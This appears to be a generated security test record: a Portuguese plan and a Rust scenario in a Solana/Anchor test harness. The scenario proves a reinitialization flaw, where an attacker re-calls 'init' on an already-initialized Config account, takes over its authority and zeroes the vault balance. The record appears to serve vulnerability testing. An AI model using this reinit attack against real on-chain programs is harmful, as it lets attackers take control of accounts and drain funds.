{"plan": "Preparo uma conta Config ja inicializada com authority=legitimo, is_initialized=true e vault_balance=1000, usando o baseline da instrucao `init` com o authority legitimo (que sobrescreve com os mesmos valores, provando o cenario). O ataque chama a mesma instrucao `init` passando a conta config ja inicializada e a carteira do atacante como authority assinante. O efeito medido e que config.authority passa a ser a chave do atacante e vault_balance foi zerado, demonstrando a reinitializacao e sobrescrita de estado.", "scenario": "let legit = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

let config_key = Pubkey::new_unique();
let config_data = anchor_account_data("Config", &(legit, true, 1000u64));
let config_acc = account(&env.program_id, &config_data, None);

let ix = env.anchor_ix("init", &(), vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(legit, true),
]);
let contas = vec![
    (config_key, config_acc.clone()),
    (legit, wallet(1_000_000_000)),
];
let r = env.baseline("init legitimo sobre config ja inicializada", &ix, &contas);

let config_after = after(&r, &config_key).clone();

let ix_atk = env.anchor_ix("init", &(), vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(attacker, true),
]);
let contas_atk = vec![
    (config_key, config_after),
    (attacker, wallet(1_000_000_000)),
];
let r_atk = env.attack("reinit sobrescrevendo authority e vault_balance", &ix_atk, &contas_atk);

if r_atk.program_result == ProgramResult::Success {
    let data = after(&r_atk, &config_key).data();
    env.effect("authority sobrescrita pelo atacante", read_pubkey(data, 8) == attacker);
    env.effect("vault_balance zerado", read_u64(data, 8 + 32 + 1) == 0);
}"}

